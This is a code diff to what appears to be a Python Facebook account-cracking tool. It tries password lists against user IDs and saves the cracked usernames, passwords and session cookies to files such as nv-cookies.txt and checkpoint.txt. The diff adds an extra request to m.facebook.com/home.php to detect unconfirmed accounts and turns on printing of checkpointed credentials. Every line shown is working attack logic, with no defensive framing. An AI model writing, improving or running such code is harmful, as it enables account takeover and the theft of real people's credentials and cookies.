@@ -427,7 +427,8 @@ def crackerr(ids,passlist):
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    if "confirmemail.php" in response.url:
+                    final = session.get('https://m.facebook.com/home.php', allow_redirects=True)
+                    if "confirmemail.php" in (response.url +  final.url):
                         print('\033[1;92m [sumon-NV] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
                         open("/sdcard/BITHI/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
@@ -444,7 +445,7 @@ def crackerr(ids,passlist):
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\033[1;91m [sumon-CP] '+ids+' | '+pas+'')
+                print('\033[1;91m [sumon-CP] '+ids+' | '+pas+'')
                 open('/sdcard/BITHI/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
